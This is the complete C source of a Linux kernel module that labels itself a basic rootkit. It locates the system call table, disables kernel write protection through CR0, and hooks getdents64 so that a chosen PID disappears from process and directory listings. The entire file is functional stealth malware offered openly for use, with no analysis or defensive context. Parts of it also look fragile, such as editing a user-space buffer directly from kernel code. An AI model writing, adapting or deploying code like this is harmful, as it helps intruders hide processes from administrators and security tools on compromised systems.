#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/syscalls.h>
#include <linux/sched.h>
#include <linux/proc_fs.h>

#define HIDE_PID 1234  // Change this to the process you want to hide

unsigned long **sys_call_table;

// Function pointer to store original getdents64 syscall
asmlinkage int (*original_getdents64)(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);

asmlinkage int hooked_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count) {
    int ret = original_getdents64(fd, dirp, count);
    struct linux_dirent64 *d;
    unsigned long offset = 0;

    while (offset < ret) {
        d = (struct linux_dirent64 *)((char *)dirp + offset);
        if (simple_strtol(d->d_name, NULL, 10) == HIDE_PID) {
            memmove(d, (char *)d + d->d_reclen, ret - offset - d->d_reclen);
            ret -= d->d_reclen;
        } else {
            offset += d->d_reclen;
        }
    }
    return ret;
}

// Locate system call table
static unsigned long **find_sys_call_table(void) {
    unsigned long offset;
    unsigned long **sct;

    for (offset = (unsigned long)sys_close; offset < ULONG_MAX; offset += sizeof(void *)) {
        sct = (unsigned long **)offset;
        if (sct[__NR_close] == (unsigned long *)sys_close)
            return sct;
    }
    return NULL;
}

static int __init rootkit_init(void) {
    printk(KERN_INFO "[*] Rootkit Loaded!\n");

    sys_call_table = find_sys_call_table();
    if (!sys_call_table) {
        printk(KERN_ERR "[!] Failed to locate syscall table\n");
        return -1;
    }

    // Disable write protection
    write_cr0(read_cr0() & (~0x10000));

    // Hook getdents64
    original_getdents64 = (void *)sys_call_table[__NR_getdents64];
    sys_call_table[__NR_getdents64] = (unsigned long *)hooked_getdents64;

    // Enable write protection
    write_cr0(read_cr0() | 0x10000);

    return 0;
}

static void __exit rootkit_exit(void) {
    // Restore original syscall
    write_cr0(read_cr0() & (~0x10000));
    sys_call_table[__NR_getdents64] = (unsigned long *)original_getdents64;
    write_cr0(read_cr0() | 0x10000);

    printk(KERN_INFO "[*] Rootkit Unloaded!\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Shiva");
MODULE_DESCRIPTION("Basic Linux Rootkit - Hides a process");
